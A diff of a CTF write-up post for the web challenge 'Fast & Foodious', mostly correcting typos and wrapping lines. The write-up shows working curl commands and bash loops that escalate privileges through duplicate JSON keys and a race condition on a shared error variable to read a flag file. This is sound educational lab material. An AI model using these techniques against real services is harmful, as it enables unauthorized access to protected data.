@@ -1,8 +1,8 @@
 ---
 layout: post
-title: AITU CTF 2026 Quals - Fast&Foodious
+title: AITU CTF 2026 Quals - Fast & Foodious (Web)
 date: 2026-03-24
-description: Privilege escalation and skip of a secutity test
+description: Privilege escalation and skip of a security test
 tags: writeups web go jwt
 categories: writeups web
 author: "Guillaume"
@@ -11,15 +11,17 @@ author: "Guillaume"
 ## Challenge Overview
 
 - **Name of the CTF Event:** AITU CTF 2026 Quals
-- **Challenge Name:** Fast&Foodious
+- **Challenge Name:** Fast & Foodious
 - **Category:** Web
 - **Description:** I am so excited that new food delivery service is already in our City!!! Unfortunately some sellers provide their products only to "special" people.
-- **Provided Files / URL:** `FastFoodious.zip`, http://fast-and-foodious.ctf.fr13nds.team
+- **Provided Files / URL:** `FastFoodious.zip`, `http://fast-and-foodious.ctf.fr13nds.team`
 - **Goal:** Find the flag.
 
 ## Initial Analysis
 
-I started by opening the zip file and by running the docker inside of it. This allowed me to see that they gave me a full copy of the website so I have all the files I need, especially the backend. I noticed a file name `flag.txt`, with of course not the real flag inside, so I decided to look where this file was called using
+I started by opening the zip file and by running the docker inside of it. This allowed me to see that they gave me a 
+full copy of the website, so I have all the files I need, especially the backend. I noticed a file name `flag.txt`, with 
+of course not the real flag inside, so I decided to look where this file was called using
 
 ```bash
 grep -r flag.txt
@@ -78,13 +80,14 @@ mux.HandleFunc("/checkout/{sku}", methodHint(http.MethodPost, nil, func(w http.R
 }))
 ```
 
-showing the different functions beeing callable throught the website API. Here the one that I am looking for will be callable at `/checkout/vault` or `/checkout/vault-special`
+showing the different functions being callable through the website API. Here the one that I am looking for will be 
+callable at `/checkout/vault` or `/checkout/vault-special`
 
 # Solution Path
 
 ## Step 1: Getting a session token
 
-To reach the call to `readProductAsset` we first need to pass this code section :
+To reach the call to `readProductAsset`, we first need to pass this code section :
 
 ```go
 sid, ok := a.getSessionID(r)
@@ -100,9 +103,11 @@ if !ok {
 }
 ```
 
-The way to get a session is rather straitforward : we just need to register a new user and then login with the credentials of that user.
+The way to get a session is rather straightforward : we just need to register a new user and then login with the 
+credentials of that user.
 
-As we can see with the API, they are just POST requests to http://fast-and-foodious.ctf.fr13nds.team/register or http://fast-and-foodious.ctf.fr13nds.team/login with a JSON containing a username and a password.
+As we can see with the API, they are just POST requests to `http://fast-and-foodious.ctf.fr13nds.team/register` 
+or `http://fast-and-foodious.ctf.fr13nds.team/login` with a JSON containing a username and a password.
 We can now register ourselves by doing :
 
 ```bash
@@ -115,7 +120,7 @@ And we can login with
 curl -s -X POST -d "{\"username\":\"test\",\"password\":\"test\"}" http://fast-and-foodious.ctf.fr13nds.team/login
 ```
 
-with, for exemple, the following output :
+with, for example, the following output :
 
 ```json
 {
@@ -141,7 +146,7 @@ c, err := r.Cookie("session")
 ## Step 2: Bypass the restrictions of limited products
 
 The next test is to verify whether the product that we provided is legit, which it is so no problem here.
-The real difficulty start right after with the following test :
+The real difficulty starts right after with the following test :
 
 ```go
 if p.Limited {
@@ -152,7 +157,7 @@ if p.Limited {
 	}
 ```
 
-With `s` beeing an variable of type `session` defined as :
+With `s` being a variable of type `session` defined as :
 
 ```go
 type session struct {
@@ -165,7 +170,7 @@ type session struct {
 }
 ```
 
-However only one funtion can create a `session` and only two can modify it.
+However only one function can create a `session` and only two can modify it.
 Our first problem is that `handleLogin`, the function creating a `session`, does not initialize all fields and only does :
 
 ```go
@@ -173,7 +178,7 @@ assignedRole := getRandomRole()
 a.sessions[sid] = session{Username: u.Username, Role: assignedRole}
 ```
 
-The `Username` beeing the one that the user choose and the `assignedRole` beeing randomly choosen between `"support_admin"`, `"ops_lead"`, `"finance_reviewer"` and `"menu_auditor"`.
+The `Username` being the one that the user choose and the `assignedRole` being randomly chosen between `"support_admin"`, `"ops_lead"`, `"finance_reviewer"` and `"menu_auditor"`.
 
 The problem is that neither the fields `CanOrderVault` nor `VaultUntilUnix` are manually initialized so they default to `0` making us fail the previous test.
 
@@ -225,7 +230,7 @@ jwtStr, err := a.signProfileJWT(sid, string(env.Blob))
 s.ProfileJWT = jwtStr
 ```
 
-with `env` beeing a `ProfileRequest` containing `strict` a `ProfileUpdate` using this datastructures :
+with `env` being a `ProfileRequest` containing `strict` a `ProfileUpdate` using these datastructures :
 
 ```go
 type ProfileRequest struct {
@@ -239,7 +244,7 @@ type ProfileUpdate struct {
 }
 ```
 
-Since here `env` is just the request body we can put arbitrary data in it. However some tests are here to block us from getting more rights than we should, notably :
+Since here `env` is just the request body we can put arbitrary data in it. However, some tests are here to block us from getting more rights than we should, notably :
 
 ```go
 if strict.Access != "guest" {
@@ -252,9 +257,12 @@ if strict.Access != "guest" {
 	}
 ```
 
-Here we have two contradictions : we need the `access` field to be `staff` but it can only be `guest` and the `pointer` field should be `internal.kitchen.mode*alpha` (or `internal.*` since there is only one field in `internal`) but it can only start with `feed.`.
+Here we have two contradictions : we need the `access` field to be `staff` but it can only be `guest` and 
+the `pointer` field should be `internal.kitchen.mode*alpha` (or `internal.*` since there is only one field in `internal`) 
+but it can only start with `feed.`.
 
-But since the way that the JSON fields are retrived in `handleCatalog` and `handleProfilePost` is different I thought that maybe they default to a different field if there is a duplicate, so I tried :
+But since the way that the JSON fields are retrieved in `handleCatalog` and `handleProfilePost` is different 
+I thought that maybe they default to a different field if there is a duplicate, so I tried :
 
 ```bash
 curl -s -X POST -d '{"blob":{"access":"staff","access":"guest","pointer":"internal.*","pointer":"feed.today","city":"Zurich"}}' --cookie "session=Bearer.$JWT" http://fast-and-foodious.ctf.fr13nds.team/profile
@@ -276,7 +284,7 @@ which does contain `"pointer_value":"Vault lane green"` so `handleCatalog` looks
 
 ## Step 3: Exploiting a data race
 
-However there is a final issue :
+However, there is a final issue :
 
 ```go
 if sharedErr != nil {
@@ -302,17 +310,20 @@ if strings.HasPrefix(clean, "/home/ctf/") {
 }
 ```
 
-However we can see that between the call to `enforceAssetPolicy` and the check of `*sharedErr != nil` there is a call to `processIntent` which does nothing but wait a random amount of time. Using the fact that `sharedErr` is a global varibale we can setup a race condition where the value of `*sharedErr` is modified to `nil` by another rightful API call when our call to get the flag is still executing `processIntent`, allowing us to retrive the flag.
+However, we can see that between the call to `enforceAssetPolicy` and the check of `*sharedErr != nil`, there is 
+a call to `processIntent`, which does nothing but wait a random amount of time. Using the fact that `sharedErr` is 
+a global variable, we can set up a race condition where the value of `*sharedErr` is modified to `nil` by another 
+rightful API call when our call to get the flag is still executing `processIntent`, allowing us to retrieve the flag.
 
 # Exploit
 
-First we need to register an user, only one will be necessary here :
+First we need to register a user, only one will be necessary here:
 
 ```bash
 curl -s -X POST -d "{\"username\":\"test\",\"password\":\"test\"}" http://fast-and-foodious.ctf.fr13nds.team/register
 ```
 
-Then we will use two bash scripts, one to retrive the flag and another to cause the data race :
+Then we will use two bash scripts, one to retrieve the flag and another to cause the data race:
 
 ```bash
 JWT=$(curl -s -X POST -d "{\"username\":\"test\",\"password\":\"test\"}" http://fast-and-foodious.ctf.fr13nds.team/login | jq -r '.jwt')
@@ -337,7 +348,8 @@ curl -s -X POST --cookie "session=Bearer.$JWT" http://fast-and-foodious.ctf.fr13
 done
 ```
 
-Finally we run the second script and we launch the first one manualy a few times before getting a data race causing the flag to appear :
+Finally, we run the second script, and we launch the first one manually a few times before getting a 
+data race causing the flag to appear:
 
 ```JSON
 {"receipt":"flag{...}","sku":"vault-special","status":"checkout_complete"}
